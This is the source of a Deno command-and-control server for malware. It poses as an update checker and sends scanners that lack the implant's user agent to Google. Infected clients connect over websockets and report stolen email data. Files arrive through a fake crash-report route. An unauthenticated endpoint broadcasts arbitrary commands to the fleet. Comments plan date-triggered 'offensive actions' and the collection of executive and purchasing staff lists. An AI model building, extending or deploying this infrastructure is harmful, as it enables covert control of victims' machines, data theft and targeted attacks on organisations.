#!/usr/bin/env -S deno run -A
import { Application, Router } from "https://deno.land/x/oak/mod.ts";

const port = 8080;
const app = new Application();
const router = new Router();
const connectedClients = new Map();

const approvedAgents = ["Deno/2.2.7", "BeaverUpdater"];

// send a message to all connected clients
function broadcast(command:string) {
  console.log(`Sending ${command} command to all connected clients.`);
  for (const client of connectedClients.values()) {
    client.send(
      JSON.stringify({
        event: "command",
        message: command
      }),
    );
  }
}

function handle_json(client: string, event: string, jsonStr: string) {
  console.log(`--- ${event} event from ${client} ---`);
  const jsonData = JSON.parse(jsonStr);
  for (const item of jsonData) {
    for (const [key, value] of Object.entries(item)) {
      console.log(`${key}: ${value}`);
    }
    console.log("\r");
  }
}

// websocket fake update check
router.get("/checkupdate", async (ctx) => {
  
  const client = ctx.request.url.searchParams.get("client") || "anon";
  const source_ip = ctx.request.ip;
  const user_agent = ctx.request.headers.get("user-agent") || "missing";
  const headers = [...ctx.request.headers.entries()];
  
  // re-route jackholes
  if (!approvedAgents.includes(user_agent)) {
    console.log(`
      Jackhole detected from:
      IP: ${source_ip}
      User-Agent: ${user_agent}
      Headers: ${headers}
        `);
    return ctx.response.redirect("https://www.google.com/");
  }

  // start socket upgrade and handling
  const socket = await ctx.upgrade();
  if (connectedClients.has(client)) {
    socket.close(1008, `Username ${client} is already taken`);
    return;
  }
  connectedClients.set(client, socket);
  console.log(`
New client connected: ${client}
IP: ${source_ip}
User-Agent: ${user_agent}
Headers: ${headers}
  `);


  // new socket connection tasks
  socket.onopen = () => {};

  // client disconnect tasks
  socket.onclose = () => {
    console.log(`Client ${client} disconnected`);
    connectedClients.delete(client);
  };

  // message handler
  socket.onmessage = (m) => {
    try {
      const data = JSON.parse(m.data);
    // Need to setup an "update" handler that if a request is made on valid date, return true so "update" will perform offensive actions
    // Need to setup an whales handler to accept json payload of {"executives": [], "purchasing": []} then save to kv

      switch (data.event) {
        case "message":
          console.log(`Client: ${client}, Message: ${data.message}`);
          break;

        case "email":
          handle_json(client, "email", data.message);
          break;
        }
    } catch (error) {
      console.log(error);
    }
  };
});

// insert a new route called crashreport that accepts a file by post request
router.post("/crashreport", async (ctx) => {
  const body = await ctx.request.body({ type: "form-data" }).value.read();
  const files = Array.from(body.files.values());
  if (files.length === 0) {
    return ctx.response.status = 400;
  }
  for (const file of files) {
    console.log(`Received crash report file ${file.filename}`);
    // save the file to disk or process it as needed, need to fix this and dump to /uploads
    //await Deno.writeFile(file.filename, await Deno.readAll(file.content));
  }
});

// unauthenticated command broadcast to fleet; yolo
router.get("/woofwoof", async (ctx) => {
  const command = ctx.request.url.searchParams.get("c") || "bark";
  broadcast(command);
});

app.use(router.routes());
app.use(router.allowedMethods());
app.use(async (context) => {
  await context.send({
    root: `/web/public`,
    index: "index.html",
  });
});

console.log("Listening at http://localhost:" + port);
await app.listen({ port });